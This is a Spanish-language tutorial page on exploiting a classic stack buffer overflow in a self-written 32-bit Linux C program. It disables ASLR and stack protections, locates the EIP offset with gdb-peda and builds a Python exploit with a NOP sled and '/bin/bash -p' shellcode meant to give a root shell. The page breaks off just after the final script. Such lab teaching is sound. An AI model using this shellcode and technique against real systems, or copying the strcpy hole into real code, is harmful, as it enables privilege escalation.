<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Buffer Overflow Linux x86</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Buffer Overflow Linux x86" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Explotación de Buffer Overflow en un binario de 32 bits de Linux" />
<meta property="og:description" content="Explotación de Buffer Overflow en un binario de 32 bits de Linux" />
<link rel="canonical" href="http://localhost:4000/another-page.html" />
<meta property="og:url" content="http://localhost:4000/another-page.html" />
<meta property="og:site_name" content="Buffer Overflow Linux x86" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Buffer Overflow Linux x86" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Explotación de Buffer Overflow en un binario de 32 bits de Linux","headline":"Explotación de Buffer Overflow en un binario de 32 bits de Linux","url":"http://localhost:4000/another-page.html"}</script>

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  </head>
  <body>

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Buffer Overflow Linux x86</h1>
          <p>Explotación de Buffer Overflow en un binario de 32 bits de Linux</p>
        </div>

<div><p>Iniciaremos con un ejemplo básico como el del siguiente programa en c</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">#include </span><span class="s2">&ltstring.h></span><span class="p">
</span><span class="kd">#include </span><span class="s2">&ltstdio.h></span><span class="p">
</span><span class="k">void</span><span class="kd"> main</span><span class="p">(</span><span class="k">int </span><span class="no">argc</span><span class="p">,</span><span class="k"> char </span><span class="kd">*</span><span class="no">argv</span><span class="p">[]) {
    copier(argv[</span><span class="na">1</span><span class="p">]);
    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"Buffer Overflow!\n"</span><span class="p">);
}
</span><span class="k">int</span><span class="kd"> copier</span><span class="p">(</span><span class="k">char</span><span class="kd"> *</span><span class="no">str</span><span class="p">) {
    </span><span class="k">char</span><span class="p"> buffer[</span><span class="na">128</span><span class="p">];
    </span><span class="k">strcpy</span><span class="p">(buffer, str);
}</span>
</code></pre></div></div><br>

<div><p>Podemos ver que el buffer asignado de 128, pero la vulnerabilidad realmente viene de usar la función strcpy con el input que proporcione el usuario</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="k">char </span><span class="p">buffer[</span><span class="na">128</span><span class="p">];
</span><span class="k">strcpy</span><span class="p">(buffer, str);</span>
</code></pre></div></div><br>

<div><p>Iniciaremos con la explotación, como esto será la explicación basica no queremos protecciones por lo que desactivaremos el ASLR en nuestra máquina, randomize_va_space tiene que valer 0</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ echo</span><span class="p"> 0 | </span><span class="s2">sudo tee </span><span class="p">/proc/sys/kernel/randomize_va_space
</span>
</code></pre></div></div><br>

<div><p>Ahora compilamos el archivo con extensión .c con ayuda de gcc con los siguientes parámetros para evitar protecciones que vienen por defecto</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">example.c                </span><span class="c1"># El nombre del archivo.c</span><span class="p">
-m32                     </span><span class="c1"># Indica que se compile para 32 bits (x86)</span><span class="p">
-z execstack             </span><span class="c1"># Deja que ejecutemos instrucciones en la pila</span><span class="p">
-fno-stack-protector     </span><span class="c1"># Deshabilita la protección en la pila</span><span class="p">
-o example               </span><span class="c1"># El nombre del binario que se cree</span>
</code></pre></div></div><br>

<div><p>Lo compilamos y nos crea el binario que nos printea la cadena 'Buffer Overflow!'</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gcc </span><span class="p">example.c -m32 -z execstack -fno-stack-protector -o example 2>/dev/null</span><span class="p">

</span><span class="s2">❯ ls</span><span class="p">
 example   example.c

</span><span class="s2">❯ ./example </span><span class="p">test
Buffer Overflow!</span>
</code></pre></div></div><br>

<div><p>Para empezar a explotarlo usaremos gdb, en mi caso con <a href="https://github.com/longld/peda">peda</a> para algunas funciones</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Para buscar el offset creamos un argumento que valga un patron de 200 caracteres con pattern_arg</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">pattern_arg 200
Set 1 arguments to program
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Al correr el programa se ejecutara con el argumento, y nos devuelve el valor que tiene EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">run
Starting program: ./example 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">[----------------------------------registers-----------------------------------]
</span><span class="s2">EAX</span><span class="p">:</span><span class="na"> 0xffffd5e0</span><span class="p"> ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EBX</span><span class="p">: 0x6c414150 ('PAAl')
</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0xffffd9e0</span><span class="p"> ("wAAZAAxAAyA")
</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0xffffd69d</span><span class="p"> ("wAAZAAxAAyA")
</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EBP</span><span class="p">: 0x41514141 ('AAQA')
</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd670</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EIP</span><span class="p">: 0x41416d41 ('AmAA')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN </span><span class="s2">trap</span><span class="kd"> INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x41416d41
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd670</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| </span><span class="na">0xffffd674</span><span class="p"> ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| </span><span class="na">0xffffd678</span><span class="p"> ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| </span><span class="na">0xffffd67c</span><span class="p"> ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| </span><span class="na">0xffffd680</span><span class="p"> ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| </span><span class="na">0xffffd684</span><span class="p"> ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| </span><span class="na">0xffffd688</span><span class="p"> ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| </span><span class="na">0xffffd68c</span><span class="p"> ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")</span><span class="na">
[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x41416d41</span><span class="p"> in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Con pattern_offset podemos saber cuantos bytes se necesitan antes de llegar a sobreescribir EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">pattern_offset 0x41416d41
1094806849 found at offset: </span><span class="na">140</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Empezaremos a crear el script en python llamado exploit.py, iniciamos por definir el offset</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span>
</code></pre></div></div><br>

<div><p>Ahora definimos un <a href="https://www.exploit-db.com/shellcodes/13697">shellcode</a> que nos ejecute la cadena '/bin/bash -p' para conseguir una shell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode </span><span class="kd">= </span><span class="p"> </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x51\x53\x89\xe1\xcd\x80"</span>
</code></pre></div></div><br>

<div><p>No podemos pasarnos de 140 bytes ya que si lo hacemos sobreescribiremos EIP, asi que el junk será el offset menos la longitud de el shellcode, asi al sumarlos seguira siendo 140</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode </span><span class="kd">= </span><span class="p"> </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x51\x53\x89\xe1\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Porque usar '\x90' para rellenar el espacio para llegar a EIP?</p></div></strong>
<div><p>Se usa '\x90' ya que es un nop (No Operation), al apuntar a el pasa a la siguiente instrucción y esto nos permite desplazar la pila y no tener que apuntar a la dirección exacta del shellcode</p></div></blockquote><br>

<div><p>Por ahora rellenaremos el lugar de la dirección del EIP con BBBB y asi poder debuguear</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode </span><span class="kd">= </span><span class="p"> </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x51\x53\x89\xe1\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 4</span><span class="k">

print</span><span class="p">(junk </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="p"> eip)</span>
</code></pre></div></div><br>

<div><p>Ejecutamos el programa de nuevo ahora pasando el exploit ejecutado como argumento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$</span><span class="p"> run $(python exploit.py)
Starting program: ./example $(python exploit.py)

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">:</span><span class="na"> 0xffffd620</span><span class="p"> --> 0x90909090 
</span><span class="s2">EBX</span><span class="p">: 0x535152e3 
</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0xffffd9e0</span><span class="p"> --> 0x89535152 
</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0xffffd6a5</span><span class="p"> --> 0x89535152 
</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EBP</span><span class="p">: 0x80cde189 
</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd6b0</span><span class="p"> --> </span><span class="na">0xffffd900</span><span class="p"> --> 0x1f 
</span><span class="s2">EIP</span><span class="p">: 0x42424242 ('BBBB')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN </span><span class="s2">trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x42424242
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd6b0</span><span class="p"> --> </span><span class="na">0xffffd900</span><span class="p"> --> 0x1f 
0004| </span><span class="na">0xffffd6b4</span><span class="p"> --> </span><span class="na">0xffffd784</span><span class="p"> --> </span><span class="na">0xffffd934</span><span class="p"> ("./example")
0008| </span><span class="na">0xffffd6b8</span><span class="p"> --> </span><span class="na">0xffffd790</span><span class="p"> --> </span><span class="na">0xffffd9ec</span><span class="p"> ("SSH_AUTH_SOCK=/tmp/ssh-2Uc5Apks9SCR/agent.1352")
0012| </span><span class="na">0xffffd6bc</span><span class="p"> --> </span><span class="kd">0x565561bd</span><span class="p"> (&ltmain+20>:	add    ebx,0x2e43)
0016| </span><span class="na">0xffffd6c0</span><span class="p"> --> </span><span class="na">0xffffd6e0</span><span class="p"> --> 0x2 
0020| </span><span class="na">0xffffd6c4</span><span class="p"> --> 0x0 
0024| </span><span class="na">0xffffd6c8</span><span class="p"> --> 0x0 
0028| </span><span class="na">0xffffd6cc</span><span class="p"> --> </span><span class="kd">0xf7ddae46</span><span class="p"> (<__libc_start_main+262>:	add    esp,0x10)
</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">, </span><span class="s2">rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x42424242 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Ahora en la pila buscaremos una dirección que solo tenga a los nops (0x90909090)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">x/300wx $esp
</span><span class="na">0xffffd6b0</span><span class="p">:	0xffffd900	0xffffd784	0xffffd790	0x565561bd</span><span class="p">
</span><span class="na">0xffffd6c0</span><span class="p">:	0xffffd6e0	0x00000000	0x00000000	0xf7ddae46</span><span class="p">
</span><span class="na">0xffffd6d0</span><span class="p">:	0xf7fa5000	0xf7fa5000	0x00000000	0xf7ddae46</span><span class="p">
</span><span class="na">0xffffd6e0</span><span class="p">:	0x00000002	0xffffd784	0xffffd790	0xffffd714</span><span class="p">
</span><span class="na">0xffffd6f0</span><span class="p">:	0xffffd724	0xf7ffdb40	0xf7fca420	0xf7fa5000</span><span class="p">
</span><span class="na">0xffffd700</span><span class="p">:	0x00000001	0x00000000	0xffffd768	0x00000000</span><span class="p">
</span><span class="na">0xffffd710</span><span class="p">:	0xf7ffd000	0x00000000	0xf7fa5000	0xf7fa5000</span><span class="p">
</span><span class="na">0xffffd720</span><span class="p">:	0x00000000	0x1be93902	0x5f1f0712	0x00000000</span><span class="p">
</span><span class="na">0xffffd730</span><span class="p">:	0x00000000	0x00000000	0x00000002	0x56556070</span><span class="p">
</span><span class="na">0xffffd740</span><span class="p">:	0x00000000	0xf7fe88f0	0xf7fe3230	0x56559000</span><span class="p">
</span><span class="na">0xffffd750</span><span class="p">:	0x00000002	0x56556070	0x00000000	0x565560a1</span><span class="p">
</span><span class="na">0xffffd760</span><span class="p">:	0x565561a9	0x00000002	0xffffd784	0x56556230</span><span class="p">
</span><span class="na">0xffffd770</span><span class="p">:	0x56556290	0xf7fe3230	0xffffd77c	0x0000001c</span><span class="p">
</span><span class="na">0xffffd780</span><span class="p">:	0x00000002	0xffffd934	0xffffd95b	0x00000000</span><span class="p">
</span><span class="na">0xffffd790</span><span class="p">:	0xffffd9ec	0xffffda1b	0xffffda2e	0xffffda3f</span><span class="p">
</span><span class="na">0xffffd7a0</span><span class="p">:	0xffffda47	0xffffda65	0xffffda95	0xffffdaa9</span><span class="p">
</span><span class="na">0xffffd7b0</span><span class="p">:	0xffffdadd	0xffffdae7	0xffffdafd	0xffffdb23</span><span class="p">
</span><span class="na">0xffffd7c0</span><span class="p">:	0xffffdb5d	0xffffdb6d	0xffffdb7e	0xffffdbb4</span><span class="p">
</span><span class="na">0xffffd7d0</span><span class="p">:	0xffffdbbf	0xffffdbce	0xffffdbe5	0xffffdbfc</span><span class="p">
</span><span class="na">0xffffd7e0</span><span class="p">:	0xffffdc18	0xffffdc41	0xffffdc50	0xffffdc6a</span><span class="p">
</span><span class="na">0xffffd7f0</span><span class="p">:	0xffffdc7d	0xffffdc98	0xffffdcac	0xffffdce0</span><span class="p">
</span><span class="na">0xffffd800</span><span class="p">:	0xffffdced	0xffffdd02	0xffffddd8	0xffffddf7</span><span class="p">
</span><span class="na">0xffffd810</span><span class="p">:	0xffffde09	0xffffde1c	0xffffde2d	0xffffde45</span><span class="p">
</span><span class="na">0xffffd820</span><span class="p">:	0xffffde5e	0xffffde73	0xffffde8d	0xffffdeb0</span><span class="p">
</span><span class="na">0xffffd830</span><span class="p">:	0xffffded2	0xffffdee6	0xffffdefd	0xffffdf14</span><span class="p">
</span><span class="na">0xffffd840</span><span class="p">:	0xffffdf25	0xffffdf30	0xffffdf44	0xffffdf62</span><span class="p">
</span><span class="na">0xffffd850</span><span class="p">:	0xffffdf92	0xffffdf9c	0xffffdfa8	0xffffdfbc</span><span class="p">
</span><span class="na">0xffffd860</span><span class="p">:	0xffffdfc5	0x00000000	0x00000020	0xf7fd0550</span><span class="p">
</span><span class="na">0xffffd870</span><span class="p">:	0x00000021	0xf7fd0000	0x00000033	0x000006f0</span><span class="p">
</span><span class="na">0xffffd880</span><span class="p">:	0x00000010	0x078bfbff	0x00000006	0x00001000</span><span class="p">
</span><span class="na">0xffffd890</span><span class="p">:	0x00000011	0x00000064	0x00000003	0x56555034</span><span class="p">
</span><span class="na">0xffffd8a0</span><span class="p">:	0x00000004	0x00000020	0x00000005	0x0000000b</span><span class="p">
</span><span class="na">0xffffd8b0</span><span class="p">:	0x00000007	0xf7fd2000	0x00000008	0x00000000</span><span class="p">
</span><span class="na">0xffffd8c0</span><span class="p">:	0x00000009	0x56556070	0x0000000b	0x000003e8</span><span class="p">
</span><span class="na">0xffffd8d0</span><span class="p">:	0x0000000c	0x000003e8	0x0000000d	0x000003eb</span><span class="p">
</span><span class="na">0xffffd8e0</span><span class="p">:	0x0000000e	0x000003eb	0x00000017	0x00000000</span><span class="p">
</span><span class="na">0xffffd8f0</span><span class="p">:	0x00000019	0xffffd91b	0x0000001a	0x00000002</span><span class="p">
</span><span class="na">0xffffd900</span><span class="p">:	0x0000001f	0xffffdfd1	0x0000000f	0xffffd92b</span><span class="p">
</span><span class="na">0xffffd910</span><span class="p">:	0x00000000	0x00000000	0x82000000	0x7cb2e1a0</span><span class="p">
</span><span class="na">0xffffd920</span><span class="p">:	0x6a7ef222	0xf555e56f	0x69d2e273	0x00363836</span><span class="p">
</span><span class="na">0xffffd930</span><span class="p">:	0x00000000	0x6d6f682f	0x61672f65	0x442f6f74</span><span class="p">
</span><span class="na">0xffffd940</span><span class="p">:	0x746b7365	0x422f706f	0x652f464f	0x706d6178</span><span class="p">
</span><span class="na">0xffffd950</span><span class="p">:	0x652f656c	0x706d6178	0x9000656c	0x90909090</span><span class="p">
</span><span class="na">0xffffd960</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd970</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd980</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd990</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9a0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9b0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9c0</span><span class="p">:	0x90909090	0x0b6a9090	0x66529958	0x89702d68</span><span class="p">
</span><span class="na">0xffffd9d0</span><span class="p">:	0x686a52e1	0x61622f68	0x622f6873	0xe3896e69</span><span class="p">
</span><span class="na">0xffffd9e0</span><span class="p">:	0x89535152	0x4280cde1	0x00424242	0x5f485353</span><span class="p">
</span><span class="na">0xffffd9f0</span><span class="p">:	0x48545541	0x434f535f	0x742f3d4b	0x732f706d</span><span class="p">
</span><span class="na">0xffffda00</span><span class="p">:	0x322d6873	0x41356355	0x39736b70	0x2f524353</span><span class="p">
</span><span class="na">0xffffda10</span><span class="p">:	0x6e656761	0x33312e74	0x53003235	0x415f4853</span><span class="p">
</span><span class="na">0xffffda20</span><span class="p">:	0x544e4547	0x4449505f	0x3034313d	0x414c0039</span><span class="p">
</span><span class="na">0xffffda30</span><span class="p">:	0x653d474e	0x584d5f73	0x4654552e	0x5300382d</span><span class="p">
</span><span class="na">0xffffda40</span><span class="p">:	0x4c564c48	0x4c00313d	0x44495f43	0x49544e45</span><span class="p">
</span><span class="na">0xffffda50</span><span class="p">:	0x41434946	0x4e4f4954	0x5f73653d	0x552e584d</span><span class="p">
</span><span class="na">0xffffda60</span><span class="p">:	0x382d4654	0x47445800	0x4552475f	0x52455445</span><span class="p">
</span><span class="na">0xffffda70</span><span class="p">:	0x5441445f	0x49445f41	0x762f3d52	0x6c2f7261</span><span class="p">
</span><span class="na">0xffffda80</span><span class="p">:	0x6c2f6269	0x74686769	0x642f6d64	0x2f617461</span><span class="p">
</span><span class="na">0xffffda90</span><span class="p">:	0x6f746167	0x4c4f4300	0x4554524f	0x743d4d52</span><span class="p">
</span><span class="na">0xffffdaa0</span><span class="p">:	0x63657572	0x726f6c6f	0x47504700	0x4547415f</span><span class="p">
</span><span class="na">0xffffdab0</span><span class="p">:	0x495f544e	0x3d4f464e	0x6e75722f	0x6573752f</span><span class="p">
</span><span class="na">0xffffdac0</span><span class="p">:	0x30312f72	0x672f3030	0x6770756e	0x672e532f</span><span class="p">
</span><span class="na">0xffffdad0</span><span class="p">:	0x612d6770	0x746e6567	0x313a303a	0x45535500</span><span class="p">
</span><span class="na">0xffffdae0</span><span class="p">:	0x61673d52	0x44006f74	0x544b5345	0x535f504f</span><span class="p">
</span><span class="na">0xffffdaf0</span><span class="p">:	0x49535345	0x623d4e4f	0x6d777073	0x444c4f00</span><span class="p">
</span><span class="na">0xffffdb00</span><span class="p">:	0x3d445750	0x6d6f682f	0x61672f65	0x442f6f74</span><span class="p">
</span><span class="na">0xffffdb10</span><span class="p">:	0x746b7365	0x422f706f	0x652f464f	0x706d6178</span><span class="p">
</span><span class="na">0xffffdb20</span><span class="p">:	0x5800656c	0x535f4744	0x49535345	0x505f4e4f</span><span class="p">
</span><span class="na">0xffffdb30</span><span class="p">:	0x3d485441	0x67726f2f	0x6572662f	0x73656465</span><span class="p">
</span><span class="na">0xffffdb40</span><span class="p">:	0x706f746b	0x7369442f	0x79616c70	0x616e614d</span><span class="p">
</span><span class="na">0xffffdb50</span><span class="p">:	0x2f726567	0x73736553	0x306e6f69	0x4d4f4800</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Nos quedamos con uno que en los 4 campos solo tenga nops (0x90909090)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xffffd990</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span>
</code></pre></div></div><br>

<div><p>Ya que estamos en 32 bits tendremos que darle la vuelta a la dirección de la siguiente forma</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xffffd9a0</span><span class="p">     -->     </span><span class="na">\xff\xff\xd9\xa0</span><span class="p">     -->     </span><span class="na">\xa0\xd9\xff\xff</span>
</code></pre></div></div><br>

<div><p>Nuestro script final para explotarlo quedaría de la siguiente forma</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode </span><span class="kd">= </span><span class="p"> </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="p"> </span><span class="k">b</span><span class="s2">"\x51\x53\x89\xe1\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xa0\xd9\xff\xff"</span><span class="k">

print</span><span class="p">(junk </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="p"> eip)</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Qué hace exactamente el script de explotación?</p></div></strong>
<li>Se define el shellcode para que se ejecute la cadena '/bin/bash -p'</li>
<li>Se rellena con nops los bytes que se necesitan para llegar al EIP</li>
<li>Se apunta a una dirección donde haya nops para que al desplazarse se ejecute el shellcode</li>
<li>Al ejecutarse el shellcode nos tira una bash como el propietario de el binario</li>
</blockquote><br><br>

<div><p>Ejecutamos el binario con el exploit ejecutado como argumento y nos lanza una bash como root</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
